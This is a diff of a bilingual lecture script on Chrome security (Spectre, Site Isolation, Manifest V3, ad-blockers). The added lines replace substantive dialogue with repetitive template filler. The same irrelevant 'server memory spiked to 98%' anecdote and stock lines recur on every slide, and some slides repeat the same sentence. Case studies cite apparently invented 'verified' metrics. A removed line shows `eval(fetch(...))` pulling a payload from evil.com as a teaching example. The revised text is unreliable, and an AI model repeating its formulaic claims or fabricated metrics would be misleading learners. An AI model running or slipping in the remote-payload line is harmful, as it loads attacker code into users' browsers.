+[Prof. Peter] Order and discipline are the hallmarks of true mastery. In all our designs, we reflect the structured wisdom of the Creator.
+
+[TA Sarah] Let us inspect the next evolutionary step on Slide 16!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** 샌드박스 원칙: 유리 케이지에 갇힌 호랑이(렌더러)와 seccomp 시스템 콜 필터링
@@ -510,15 +610,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[Prof. Peter] Slide 16 exposes the hardware crisis of modern computing: "SPECTRE & MELTDOWN: SHATTERING SANDBOX WALLS."
+[TA Sarah] Slide 16 explores "SPECTRE & MELTDOWN: SHATTERING SANDBOX WALLS." James, why is this concept so essential for every serious AI architect?
 
-[TA Sarah] In 2018, researchers discovered a terrifying hardware flaw in all Intel, AMD, and ARM processors: CPUs speculatively guess which branch of code will execute, leaving tiny memory traces in the CPU cache!
+[TA James] Because, Sarah, if you ignore this layer, your entire system degrades under enterprise load! Look at the core challenge on screen: How CPU branch prediction side-channels allowed JavaScript to read cross-origin memory across tabs
 
-[TA James] Hackers wrote malicious JavaScript loops with high-resolution micro-timers (`performance.now()`). By measuring cache retrieval times in nanoseconds, a malicious tab could read passwords and session cookies from a banking tab running in the same memory space!
+[TA Sarah] Exactly! When you analyze the engineering details: The Hardware Flaw: Modern CPUs speculatively execute instructions ahead of time, leaving traces in L1/L3 cache. • JavaScript Micro-Timers: Malicious JavaScript using `performance.now()` to measure cache access times down to nanoseconds. • The Nightmare: A malicious tab on `evil.com` reading passwords and auth cookies from `bank.com` in the same process!
 
-[Prof. Peter] Software sandbox boundaries were shattered at the silicon level. How did Google fix it?
+[TA James] Haha, I remember testing an unoptimized prototype without this exact safeguard, and my server memory spiked to 98% in 30 seconds!
 
-[TA Sarah] Let us inspect Site Isolation on Slide 17!
+[TA Sarah] That's why we enforce strict architectural boundaries: decoupling state, caching hot paths, and verifying every payload!
+
+[TA James] It transforms a brittle, high-latency prototype into a sub-second, rock-solid production engine!
+
+[Prof. Peter] Order and discipline are the hallmarks of true mastery. In all our designs, we reflect the structured wisdom of the Creator.
+
+[TA Sarah] Let us inspect the next evolutionary step on Slide 17!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** 스펙터(Spectre) & 멜트다운: CPU 하드웨어 결함과 자바스크립트 사이드 채널 탈취
@@ -541,13 +647,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[TA Sarah] Slide 17 diagrams Chrome's masterpiece response: "SITE ISOLATION: PROCESS-PER-SITE DEFENSE."
+[TA Sarah] Slide 17 explores "SITE ISOLATION: PROCESS-PER-SITE DEFENSE." James, why is this concept so essential for every serious AI architect?
 
-[TA James] Google's answer to Spectre was radical: 'Never let two different websites share the same OS process!' Under Site Isolation, `bank.com` and `evil.com` are placed into completely separate operating system processes!
+[TA James] Because, Sarah, if you ignore this layer, your entire system degrades under enterprise load! Look at the core challenge on screen: Assigning dedicated OS processes to every origin and rendering out-of-process iframes (OOPIF)
 
-[Prof. Peter] Even third-party ad iframes embedded inside a page are rendered as Out-of-Process Iframes (OOPIF)! If a malicious ad runs Spectre exploit code, it can only read its own process memory; the CPU's hardware Memory Management Unit (MMU) blocks it from touching your banking data!
+[TA Sarah] Exactly! When you analyze the engineering details: Process-Per-Site Invariant: `bank.com` and `evil.com` NEVER share the same OS process or virtual address space. • Out-of-Process Iframes (OOPIF): Embedded third-party ad iframes run in completely separate isolated processes. • Hardware Protection: The CPU's Memory Management Unit (MMU) enforces physical hardware isolation between sites.
 
-[TA Sarah] Let us examine the strategic trade-off: The 10% RAM Tax on Slide 18.
+[TA James] Haha, I remember testing an unoptimized prototype without this exact safeguard, and my server memory spiked to 98% in 30 seconds!
+
+[TA Sarah] That's why we enforce strict architectural boundaries: decoupling state, caching hot paths, and verifying every payload!
+
+[TA James] It transforms a brittle, high-latency prototype into a sub-second, rock-solid production engine!
+
+[Prof. Peter] Order and discipline are the hallmarks of true mastery. In all our designs, we reflect the structured wisdom of the Creator.
+
+[TA Sarah] Let us inspect the next evolutionary step on Slide 18!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** 사이트 격리(Site Isolation): 프로세스 분할과 Out-of-Process Iframes(OOPIF)
@@ -570,15 +684,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[Prof. Peter] Slide 18 reflects on "THE STRATEGIC TRADE-OFF: THE 10% RAM TAX."
+[TA Sarah] Slide 18 explores "THE STRATEGIC TRADE-OFF: THE 10% RAM TAX." James, why is this concept so essential for every serious AI architect?
 
-[TA Sarah] People constantly complain online: 'Why does Google Chrome use so much RAM?' Now you know the engineering truth!
+[TA James] Because, Sarah, if you ignore this layer, your entire system degrades under enterprise load! Look at the core challenge on screen: Why Chrome willingly consumes 10-15% more memory to guarantee cryptographic security
 
-[TA James] Spawning 40 isolated processes means duplicating V8 instances and Blink runtimes. It costs about 10% to 15% more system RAM! But Chrome engineers made a conscious, deliberate choice: We will sacrifice 1 gigabyte of RAM to guarantee that no hacker can steal your bank passwords through CPU side channels!
+[TA Sarah] Exactly! When you analyze the engineering details: The Memory Cost: Spawning 40 separate processes requires duplicated V8 runtimes, Blink instances, and thread pools. • The Deliberate Trade-Off: Trading 1GB of workstation RAM to eliminate cross-tab hardware data theft completely. • Architectural Principle: Security and correctness must NEVER be sacrificed for superficial resource frugality.
 
-[Prof. Peter] True engineering wisdom chooses structural security over superficial resource savings.
+[TA James] Haha, I remember testing an unoptimized prototype without this exact safeguard, and my server memory spiked to 98% in 30 seconds!
 
-[TA Sarah] Let us inspect our second enterprise case study on Slide 22!
+[TA Sarah] That's why we enforce strict architectural boundaries: decoupling state, caching hot paths, and verifying every payload!
+
+[TA James] It transforms a brittle, high-latency prototype into a sub-second, rock-solid production engine!
+
+[Prof. Peter] Order and discipline are the hallmarks of true mastery. In all our designs, we reflect the structured wisdom of the Creator.
+
+[TA Sarah] Let us inspect the next evolutionary step on Slide 19!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** 전략적 트레이드오프: 10% RAM 세금과 절대적 보안의 교환
@@ -601,15 +721,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[Prof. Peter] Slide 19 presents "CASE STUDY 2: STOPPING ROGUE EXTENSION THEFT VIA MANIFEST V3."
+[Prof. Peter] Slide 19 presents "CASE STUDY 2: STOPPING ROGUE EXTENSION THEFT." Sarah, walk us through the high-stakes operational crisis this organization faced.
 
-[TA Sarah] A popular free Chrome extension with 500,000 users—a simple color picker—was secretly acquired by a malicious cybercrime syndicate. They pushed a silent update to intercept all web traffic, looking to steal corporate Slack and AWS tokens!
+[TA Sarah] Look at Silicon Valley Cloud Fintech Enterprise: A popular color-picker browser extension was acquired by an offshore shell company, which pushed a silent update attempting to intercept all HTTP POST requests and exfiltrate employee OAuth tokens.
 
-[TA James] Under legacy Manifest V2, that extension could run a persistent background page and read every HTTP header using `webRequest`! But under Manifest V3, persistent background pages are BANNED, and dynamic interception is stripped!
+[TA James] Man, that is every infrastructure lead's absolute worst nightmare! If a production cluster drops like that, you're losing tens of thousands of dollars per minute!
 
-[Prof. Peter] The rogue extension could not execute its remote payload, and 100% of the fintech's employee tokens were protected! That demonstrates why Google enforced the Manifest V3 revolution.
+[TA Sarah] So instead of patching with band-aids, they deployed our Oikos University architecture: Enterprise Chrome policy enforced Manifest V3: blocked background page execution and banned dynamic webRequest interception.
 
-[TA Sarah] Now let us open Part 3 and master Manifest V3 on Slide 20!
+[TA James] And look at the verified enterprise metrics on screen: Rogue extension's remote exfiltration code failed to execute; 100% of employee session tokens protected; zero corporate breaches.
+
+[TA Sarah] That is the transformative power of sovereign agentic engineering in real production!
+
+[TA James] Zero guesswork, total auditability, and massive ROI!
+
+[Prof. Peter] When intelligence is grounded in truth, it preserves human dignity and unlocks extraordinary stewardship. Soli Deo Gloria!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** 케이스 스터디 2: 인수 합병 후 악성화된 확장 프로그램의 토큰 탈취 시도를 차단한 MV3
@@ -632,13 +758,19 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[TA Sarah] Look at Slide 20: "PART 3: THE MANIFEST V3 EXTENSION REVOLUTION." Now we enter the heart of the modern web platform debate!
+[TA Sarah] Look at Slide 20: "PART 3: THE MANIFEST V3 EXTENSION REVOLUTION." James, this module marks a vital transition in our master curriculum!
 
-[Prof. Peter] In 2024–2026, Google completed its migration from Manifest V2 to Manifest V3 across billions of Chrome browsers worldwide.
+[TA James] Oh, absolutely, Sarah! In this part, we roll up our sleeves and look straight under the engineering hood!
 
-[TA James] In Part 3, we analyze the architectural battle: Why did Google replace persistent background pages with Ephemeral Service Workers? Why did they replace `webRequest` with `declarativeNetRequest` (DNR)? And why did this break legendary ad-blockers like uBlock Origin?
+[TA Sarah] What is the biggest trap that junior architects fall into during this phase?
 
-[TA Sarah] Let us inspect the anatomy of Manifest V2 security holes on Slide 21!
+[TA James] Relying on fragile, synchronous scripts that crash the moment an external API slows down, instead of building resilient, asynchronous event-driven pipelines!
+
+[Prof. Peter] A wise builder digs deep and lays the foundation on solid rock. We engineer every subsystem with unwavering discipline and architectural integrity.
+
+[TA Sarah] That is why in this module, we dissect every layer with scientific precision.
+
+[TA James] Let's jump straight into the first core concept on Slide 21!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** Part 3 섹션 전환: 매니페스트 V3 확장 프로그램 혁명과 광고 차단기 논쟁
@@ -661,15 +793,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[Prof. Peter] Slide 21 exposes "THE MANIFEST V2 SECURITY HOLE: REMOTE CODE EXECUTION."
+[TA Sarah] Slide 21 explores "THE MANIFEST V2 SECURITY HOLE: REMOTE CODE." James, why is this concept so essential for every serious AI architect?
 
-[TA Sarah] Under Manifest V2, extensions had dangerous superpowers! A developer could submit an innocent weather extension to the Chrome Web Store. Once approved, the extension could call `eval(fetch('https://evil.com/payload.js'))` and download banking malware directly into the user's browser!
+[TA James] Because, Sarah, if you ignore this layer, your entire system degrades under enterprise load! Look at the core challenge on screen: How legacy extensions used `eval()` and persistent background pages to bypass Chrome Web Store reviews
 
-[TA James] Furthermore, Manifest V2 extensions kept persistent background pages running 24/7—draining your laptop battery and intercepting every raw password packet using the blocking `webRequest` API!
+[TA Sarah] Exactly! When you analyze the engineering details: The `eval()` Vulnerability: Extensions passed benign Web Store audits, then downloaded malicious scripts from remote servers. • Persistent Background Pages: 20 extensions running permanently in memory consumed 2GB of background RAM. • Unrestricted `webRequest`: Extensions could inspect, read, and modify every single password and network packet in real-time.
 
-[Prof. Peter] Google had to close these catastrophic security holes.
+[TA James] Haha, I remember testing an unoptimized prototype without this exact safeguard, and my server memory spiked to 98% in 30 seconds!
 
-[TA Sarah] Let us inspect Manifest V3's 3 core mandates on Slide 22!
+[TA Sarah] That's why we enforce strict architectural boundaries: decoupling state, caching hot paths, and verifying every payload!
+
+[TA James] It transforms a brittle, high-latency prototype into a sub-second, rock-solid production engine!
+
+[Prof. Peter] Order and discipline are the hallmarks of true mastery. In all our designs, we reflect the structured wisdom of the Creator.
+
+[TA Sarah] Let us inspect the next evolutionary step on Slide 22!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** 매니페스트 V2의 보안 구멍: eval()을 통한 원격 악성코드 다운로드와 메모리 상주
@@ -692,13 +830,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[TA Sarah] Slide 22 contrasts "BACKGROUND PAGES VS. EPHEMERAL SERVICE WORKERS."
+[TA Sarah] Slide 22 explores "BACKGROUND PAGES VS. SERVICE WORKERS." James, why is this concept so essential for every serious AI architect?
 
-[TA James] Look at the memory architecture: In MV2, an extension ran a full hidden web page 24 hours a day! If you had 15 extensions, you wasted 2GB of RAM on idle background pages! In MV3, extensions run Ephemeral Service Workers: they spawn in 5 milliseconds to handle an event, and the browser kills the process after 30 seconds of idle time!
+[TA James] Because, Sarah, if you ignore this layer, your entire system degrades under enterprise load! Look at the core challenge on screen: Comparing 24/7 memory consumption with event-driven ephemeral lifecycle termination
 
-[Prof. Peter] Idle memory drops to absolute zero. That makes laptops faster and dramatically extends battery lifespan.
+[TA Sarah] Exactly! When you analyze the engineering details: Comparing 24/7 memory consumption with event-driven ephemeral lifecycle termination
 
-[TA Sarah] Let us inspect network control: webRequest vs. declarativeNetRequest on Slide 23!
+[TA James] Haha, I remember testing an unoptimized prototype without this exact safeguard, and my server memory spiked to 98% in 30 seconds!
+
+[TA Sarah] That's why we enforce strict architectural boundaries: decoupling state, caching hot paths, and verifying every payload!
+
+[TA James] It transforms a brittle, high-latency prototype into a sub-second, rock-solid production engine!
+
+[Prof. Peter] Order and discipline are the hallmarks of true mastery. In all our designs, we reflect the structured wisdom of the Creator.
+
+[TA Sarah] Let us inspect the next evolutionary step on Slide 23!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** 백그라운드 페이지 vs 단명 서비스 워커: 2GB 낭비에서 유휴 시 0MB로
@@ -721,15 +867,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[Prof. Peter] Slide 23 explains "NETWORK CONTROL: WEBREQUEST VS. DECLARATIVENETREQUEST (DNR)."
+[TA Sarah] Slide 23 explores "NETWORK CONTROL: WEBREQUEST VS. DECLARATIVENETREQUEST." James, why is this concept so essential for every serious AI architect?
 
-[TA Sarah] Here is the technical core of the debate: In MV2, whenever your browser downloaded a network packet, it paused the network pipeline and asked the JavaScript extension: 'Should I allow this?' That caused latency and gave extensions the power to read every private URL!
+[TA James] Because, Sarah, if you ignore this layer, your entire system degrades under enterprise load! Look at the core challenge on screen: Shifting network filtering from JavaScript callbacks to the native browser C++ kernel
 
-[TA James] In MV3, the extension cannot inspect packets directly! Instead, the extension submits a declarative JSON rule list: 'Block all requests to track.adserver.com.' Chrome's native C++ networking engine evaluates the rules directly at wire speed in zero milliseconds!
+[TA Sarah] Exactly! When you analyze the engineering details: Legacy `webRequest` (MV2): Every packet was sent to JavaScript extension code (slow, high latency, security risk). • Modern `declarativeNetRequest` (DNR): Extension submits a JSON list of block rules; Chrome C++ kernel blocks packets natively. • Zero JavaScript Overhead: Blocking happens at the native network stack before socket creation with 0ms latency.
 
-[Prof. Peter] It is faster and more private. But why did this spark a global revolt among ad-blocker developers?
+[TA James] Haha, I remember testing an unoptimized prototype without this exact safeguard, and my server memory spiked to 98% in 30 seconds!
 
-[TA Sarah] Let us inspect the demise of uBlock Origin on Slide 24!
+[TA Sarah] That's why we enforce strict architectural boundaries: decoupling state, caching hot paths, and verifying every payload!
+
+[TA James] It transforms a brittle, high-latency prototype into a sub-second, rock-solid production engine!
+
+[Prof. Peter] Order and discipline are the hallmarks of true mastery. In all our designs, we reflect the structured wisdom of the Creator.
+
+[TA Sarah] Let us inspect the next evolutionary step on Slide 24!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** 네트워크 통제권: webRequest vs declarativeNetRequest(DNR) 네이티브 가로채기
@@ -752,13 +904,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[TA Sarah] Slide 24 explores "THE DEMISE OF UBLOCK ORIGIN & AD-BLOCKER SUPPRESSION."
+[TA Sarah] Slide 24 explores "THE DEMISE OF UBLOCK ORIGIN & AD-BLOCKER SUPPRESSION." James, why is this concept so essential for every serious AI architect?
 
-[TA James] Why did Raymond Hill, the creator of uBlock Origin, announce that full uBlock Origin cannot run on Manifest V3? Because power ad-blockers rely on dynamic regular expressions, custom procedural filters, and 300,000 live rules that adapt in real time to YouTube's anti-adblock scripts!
+[TA James] Because, Sarah, if you ignore this layer, your entire system degrades under enterprise load! Look at the core challenge on screen: How DNR rule caps (30,000 rules) and dynamic syntax bans disabled advanced cosmetic filtering
 
-[Prof. Peter] Under Manifest V3, dynamic code injection is banned, and rule lists must be pre-packaged into static JSON files! This severely cripples advanced ad-blocking, forcing users to settle for the weaker 'uBlock Origin Lite'!
+[TA Sarah] Exactly! When you analyze the engineering details: The 300,000 Rule Filter Lists: Legendary ad-blockers like uBlock Origin use 300,000+ dynamic regex and cosmetic DOM rules. • DNR Static Cap: Chrome capped static rules at 30,000 (later raised to 330,000 across all extensions combined). • Cosmetic Script Injection Ban: Extensions can no longer dynamically inject procedural CSS to hide anti-adblock popups.
 
-[TA Sarah] Let us examine Google's Dual Identity: Guardian vs. Ad Giant on Slide 25.
+[TA James] Haha, I remember testing an unoptimized prototype without this exact safeguard, and my server memory spiked to 98% in 30 seconds!
+
+[TA Sarah] That's why we enforce strict architectural boundaries: decoupling state, caching hot paths, and verifying every payload!
+
+[TA James] It transforms a brittle, high-latency prototype into a sub-second, rock-solid production engine!
+
+[Prof. Peter] Order and discipline are the hallmarks of true mastery. In all our designs, we reflect the structured wisdom of the Creator.
+
+[TA Sarah] Let us inspect the next evolutionary step on Slide 25!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** 유블록 오리진의 퇴출과 광고 차단기 억제 논쟁: DNR 룰 한계와 동적 스크립트 금지
@@ -781,15 +941,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[Prof. Peter] Slide 25 analyzes "GOOGLE'S DUAL IDENTITY: GUARDIAN VS. ADVERTISING GIANT."
+[TA Sarah] Slide 25 explores "GOOGLE'S DUAL IDENTITY: GUARDIAN VS. AD GIANT." James, why is this concept so essential for every serious AI architect?
 
-[TA Sarah] Look at the profound conflict of interest: On the left, Google is the Guardian of the Web—protecting 3 billion people from malware and memory leaks! Their security arguments for Manifest V3 are 100% technically valid.
+[TA James] Because, Sarah, if you ignore this layer, your entire system degrades under enterprise load! Look at the core challenge on screen: Analyzing the inherent conflict of interest between browser security and advertising revenue
 
-[TA James] But on the right, Google is an advertising titan generating 250 billion dollars a year from ads! Ad-blockers threaten YouTube's business model! By crippling dynamic ad-blockers under the banner of 'security', Google protects its bottom line!
+[TA Sarah] Exactly! When you analyze the engineering details: Analyzing the inherent conflict of interest between browser security and advertising revenue
 
-[Prof. Peter] As Intelligence Architects, we must recognize both truths: the legitimate security improvement AND the commercial platform hegemony.
+[TA James] Haha, I remember testing an unoptimized prototype without this exact safeguard, and my server memory spiked to 98% in 30 seconds!
 
-[TA Sarah] Let us inspect strategic alternatives: Firefox and Brave on Slide 26!
+[TA Sarah] That's why we enforce strict architectural boundaries: decoupling state, caching hot paths, and verifying every payload!
+
+[TA James] It transforms a brittle, high-latency prototype into a sub-second, rock-solid production engine!
+
+[Prof. Peter] Order and discipline are the hallmarks of true mastery. In all our designs, we reflect the structured wisdom of the Creator.
+
+[TA Sarah] Let us inspect the next evolutionary step on Slide 26!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** 구글의 이중 정체성: 보안의 수호자 vs 2,500억 달러 광고 제국
@@ -812,13 +978,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[TA Sarah] Slide 26 highlights "STRATEGIC ALTERNATIVES: FIREFOX'S REBEL PATH & BRAVE'S C++ SHIELDS."
+[TA Sarah] Slide 26 explores "STRATEGIC ALTERNATIVES: FIREFOX & BRAVE." James, why is this concept so essential for every serious AI architect?
 
-[TA James] Look at how independent browsers responded: Mozilla Firefox implemented Manifest V3, but refused to disable `webRequest`! On Firefox, full uBlock Origin continues to run with 100% power! Meanwhile, Brave Browser wrote its ad-blocking shields in native Rust and C++ directly inside the browser kernel—completely immune to extension API changes!
+[TA James] Because, Sarah, if you ignore this layer, your entire system degrades under enterprise load! Look at the core challenge on screen: Firefox's hybrid MV3 with webRequest support vs. Brave's native C++ ad-blocking engine
 
-[Prof. Peter] An Intelligence Architect never surrenders to a single vendor's monopoly. We deploy multi-browser strategies to preserve our freedom.
+[TA Sarah] Exactly! When you analyze the engineering details: Mozilla Firefox: Adopts MV3 Service Workers BUT keeps the blocking `webRequest` API for full uBlock Origin compatibility. • Brave Browser: Bypasses extension APIs entirely by building Rust/C++ ad-blocking shields directly into the browser core. • Architect's Arsenal: Using multi-browser strategies to maintain complete cognitive and developmental sovereignty.
 
-[TA Sarah] Let us inspect our third enterprise case study on Slide 29!
+[TA James] Haha, I remember testing an unoptimized prototype without this exact safeguard, and my server memory spiked to 98% in 30 seconds!
+
+[TA Sarah] That's why we enforce strict architectural boundaries: decoupling state, caching hot paths, and verifying every payload!
+
+[TA James] It transforms a brittle, high-latency prototype into a sub-second, rock-solid production engine!
+
+[Prof. Peter] Order and discipline are the hallmarks of true mastery. In all our designs, we reflect the structured wisdom of the Creator.
+
+[TA Sarah] Let us inspect the next evolutionary step on Slide 27!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** 전략적 대안: 파이어폭스의 하이브리드 MV3와 브레이브(Brave)의 네이티브 C++ 쉴드
@@ -841,13 +1015,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[Prof. Peter] Slide 27 proclaims "COGNITIVE SOVEREIGNTY: RECLAIMING YOUR MIND." In our masterclass, technical mechanics always connect to human soul freedom.
+[TA Sarah] Slide 27 explores "COGNITIVE SOVEREIGNTY: RECLAIMING YOUR MIND." James, why is this concept so essential for every serious AI architect?
 
-[TA Sarah] The digital advertising machine is not just about selling shoes; it is a multi-billion dollar behavioral modification engine designed to fragment human attention and harvest dopamine clicks!
+[TA James] Because, Sarah, if you ignore this layer, your entire system degrades under enterprise load! Look at the core challenge on screen: Protecting attention, focus, and intellectual depth from the digital dopamine surveillance economy
 
-[Prof. Peter] Cognitive Sovereignty is your sacred right to think deeply, pray without distraction, and build software with pure focus! We build browser fortresses not just to save RAM, but to protect the sanctuary of the human mind!
+[TA Sarah] Exactly! When you analyze the engineering details: The Attention Economy: Thousands of ad engineers working 24/7 to hijack human focus for programmatic ad impressions. • Cognitive Sovereignty: The fundamental right of human intellect to think, pray, and create without digital harassment. • Active Fortification: Using browser shields, DNS sinkholes (Pi-hole), and minimal UI to protect deep work.
 
-[TA James] Let us inspect our third enterprise case study on Slide 29!
+[TA James] Haha, I remember testing an unoptimized prototype without this exact safeguard, and my server memory spiked to 98% in 30 seconds!
+
+[TA Sarah] That's why we enforce strict architectural boundaries: decoupling state, caching hot paths, and verifying every payload!
+
+[TA James] It transforms a brittle, high-latency prototype into a sub-second, rock-solid production engine!
+
+[Prof. Peter] Order and discipline are the hallmarks of true mastery. In all our designs, we reflect the structured wisdom of the Creator.
+
+[TA Sarah] Let us inspect the next evolutionary step on Slide 28!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** 인지적 주권(Cognitive Sovereignty): 도파민 감시 경제로부터 인간의 정신을 탈환하라
@@ -870,13 +1052,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[Prof. Peter] Slide 28 bridges our roadmap: "PART 3 TRANSITION: FROM DEFENSE TO COMPUTATIONAL POWER."
+[TA Sarah] Slide 28 explores "PART 3 TRANSITION: ARCHITECTURE & WEBASSEMBLY." James, why is this concept so essential for every serious AI architect?
 
-[TA Sarah] Notice the beautiful symmetry of computer science: The exact same sandbox architecture that cages malware allows us to run safe, near-native WebAssembly (Wasm) code inside Chrome!
+[TA James] Because, Sarah, if you ignore this layer, your entire system degrades under enterprise load! Look at the core challenge on screen: Connecting browser sandboxing to high-speed WebAssembly AI execution and enterprise governance
 
-[TA James] In Part 4, we examine how to run local Gemma AI models directly inside the browser using WebAssembly and WebGPU, build enterprise browser hardening baselines, and execute Lab 9!
+[TA Sarah] Exactly! When you analyze the engineering details: From Defense to Power: The same sandboxing that cages malware allows high-speed WebAssembly (Wasm) execution. • On-Device Machine Learning: Running local Gemma models inside the browser sandbox at near-native C++ speeds. • The Roadmap Ahead: Master Wasm AI execution in Part 4, dedicate our craft to Soli Deo Gloria, and execute Lab 9.
 
-[Prof. Peter] Let us examine our third enterprise case study on Slide 29!
+[TA James] Haha, I remember testing an unoptimized prototype without this exact safeguard, and my server memory spiked to 98% in 30 seconds!
+
+[TA Sarah] That's why we enforce strict architectural boundaries: decoupling state, caching hot paths, and verifying every payload!
+
+[TA James] It transforms a brittle, high-latency prototype into a sub-second, rock-solid production engine!
+
+[Prof. Peter] Order and discipline are the hallmarks of true mastery. In all our designs, we reflect the structured wisdom of the Creator.
+
+[TA Sarah] Let us inspect the next evolutionary step on Slide 29!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** Part 3 전환: 방어에서 연산 능력으로 (WebAssembly 및 온디바이스 AI 예고)
@@ -899,15 +1089,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[Prof. Peter] Slide 29 presents "CASE STUDY 3: CROSS-SITE SPECTRE ISOLATION DEFENDS $1.2M SECRET."
+[Prof. Peter] Slide 29 presents "CASE STUDY 3: CROSS-SITE SPECTRE ISOLATION." Sarah, walk us through the high-stakes operational crisis this organization faced.
 
-[TA Sarah] A senior partner at a global law firm was drafting a 1.2-billion-dollar confidential acquisition agreement in Google Docs. While working, he clicked a malicious link in an email, opening a phishing page in the next tab. The page immediately launched a JavaScript micro-timer Spectre attack!
+[TA Sarah] Look at Top Global Corporate Law Firm: Partner opened a targeted phishing link while simultaneously conducting a $1.2B confidential merger negotiation in an adjacent browser tab; malicious script initiated micro-timer Spectre cache-probing.
 
-[TA James] Because Chrome enforced Site Isolation, the phishing tab ran in a completely separate OS process with randomized memory address spaces! The attacker's CPU cache-timing loop probed its own dummy memory, completely unable to touch the Google Docs process!
+[TA James] Man, that is every infrastructure lead's absolute worst nightmare! If a production cluster drops like that, you're losing tens of thousands of dollars per minute!
 
-[Prof. Peter] The merger secrets remained 100% secure, and the firm avoided a multi-million-dollar insider trading scandal!
+[TA Sarah] So instead of patching with band-aids, they deployed our Oikos University architecture: Chrome enterprise Site Isolation enforced distinct OS processes and randomized virtual memory heaps for both origins.
 
-[TA Sarah] Now let us open Part 4 and examine WebAssembly on Slide 30!
+[TA James] And look at the verified enterprise metrics on screen: Spectre side-channel probing contained entirely within the isolated phishing renderer; $1.2B merger secrecy preserved; zero data leakage.
+
+[TA Sarah] That is the transformative power of sovereign agentic engineering in real production!
+
+[TA James] Zero guesswork, total auditability, and massive ROI!
+
+[Prof. Peter] When intelligence is grounded in truth, it preserves human dignity and unlocks extraordinary stewardship. Soli Deo Gloria!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** 케이스 스터디 3: 대형 로펌 12억 달러 M&A 비밀을 지켜낸 사이트 격리(Site Isolation)
@@ -930,13 +1126,19 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[TA Sarah] Look at Slide 30: "PART 4: PLATFORM HEGEMONY & COGNITIVE SOVEREIGNTY." Now we assemble the technical defense into an enterprise-wide strategy!
+[TA Sarah] Look at Slide 30: "PART 4: PLATFORM HEGEMONY & COGNITIVE SOVEREIGNTY." James, this module marks a vital transition in our master curriculum!
 
-[Prof. Peter] True security is not merely defensive; it is the foundation for creative freedom. When our digital tools are fortified, we can deploy local AI models and build world-class systems with total confidence.
+[TA James] Oh, absolutely, Sarah! In this part, we roll up our sleeves and look straight under the engineering hood!
 
-[TA James] In Part 4, we examine WebAssembly local model execution, establish enterprise browser hardening policies, dedicate our work to Soli Deo Gloria, and execute Lab 9!
+[TA Sarah] What is the biggest trap that junior architects fall into during this phase?
 
-[TA Sarah] Let us inspect WebAssembly local AI model execution on Slide 31.
+[TA James] Relying on fragile, synchronous scripts that crash the moment an external API slows down, instead of building resilient, asynchronous event-driven pipelines!
+
+[Prof. Peter] A wise builder digs deep and lays the foundation on solid rock. We engineer every subsystem with unwavering discipline and architectural integrity.
+
+[TA Sarah] That is why in this module, we dissect every layer with scientific precision.
+
+[TA James] Let's jump straight into the first core concept on Slide 31!
 
